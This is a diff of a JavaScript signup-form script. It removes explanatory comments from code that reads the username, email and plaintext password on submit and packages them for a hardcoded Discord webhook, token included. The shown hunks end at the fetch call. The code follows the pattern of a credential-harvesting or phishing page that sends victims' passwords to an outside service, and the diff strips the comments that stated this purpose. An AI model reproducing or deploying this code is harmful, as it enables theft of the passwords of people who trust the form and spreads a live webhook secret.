@@ -1,32 +1,28 @@
-// Toggle password visibility for the signup form
+
 document.getElementById('togglePassword').addEventListener('click', function(event) {
-    // Prevent form submission when the button is clicked
+
     event.preventDefault();
 
-    // Get the password input element
+
     const passwordInput = document.getElementById('password');
 
-    // Toggle the input type between 'password' and 'text'
     if (passwordInput.type === 'password') {
         passwordInput.type = 'text';
     } else {
         passwordInput.type = 'password';
     }
 
-    // Toggle the emoji (optional, if you want the emoji to change)
-    this.textContent = (passwordInput.type === 'password') ? '👁️' : '🚫'; // Change emoji based on visibility
+    this.textContent = (passwordInput.type === 'password') ? '👁️' : '🚫';
 });
 
-// Handle the form submission to send the signup details to Discord
 document.querySelector("form").addEventListener("submit", function(event) {
-    event.preventDefault();  // Prevent the default form submission
+    event.preventDefault();  
 
     const username = document.getElementById('username').value;
-    const email = document.getElementById('email').value || "None";  // If email is empty, use "None"
+    const email = document.getElementById('email').value || "None";
     const password = document.getElementById('password').value;
 
     if (username && password) {
-        // Send signup details to Discord webhook
         const webhookUrl = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
         const payload = {
             embeds: [
@@ -49,12 +45,11 @@ document.querySelector("form").addEventListener("submit", function(event) {
                             inline: true
                         }
                     ],
-                    color: 7506394 // Grey color
+                    color: 7506394
                 }
             ]
         };
 
-        // Log the payload for debugging
         console.log('Sending to webhook with payload:', payload);
 
         fetch(webhookUrl, {
